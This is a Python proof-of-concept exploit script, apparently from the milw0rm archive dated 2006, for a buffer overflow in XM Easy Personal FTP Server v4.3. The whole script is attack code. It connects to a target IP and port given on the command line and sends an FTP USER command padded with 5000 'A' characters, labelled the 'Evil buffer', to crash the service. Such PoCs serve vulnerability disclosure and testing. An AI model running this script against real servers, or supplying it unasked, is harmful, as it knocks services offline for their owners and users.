##############################################################
# XM EASY PERSONAL FTP SERVER v4.3                           #  
# http://www.securityfocus.com/archive/1/432960/30/0/threaded# 
# Buffer Overflow Vulnerability PoC                          #  
# ahmed@rewterz.com                                          #
##############################################################

import socket
import struct
import time
import sys


buff='USER '+'A'*5000+'\r\n'

if len(sys.argv)!=3:
	print "[+] Usage: %s <ip> <port> \n" %sys.argv[0]
	sys.exit(0)

try:
	
        print "[+] Connecting to %s" %sys.argv[1]
        s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	connect=s.connect((sys.argv[1],int(sys.argv[2])))
	print "[+] Sending Evil buffer"
	time.sleep(1)
	s.send(buff)
        print "[+] Service Crashed"
        s.recv(1024)
	
except:
	print "[+] Could Not Connect To ftp server"

# milw0rm.com [2006-05-04]
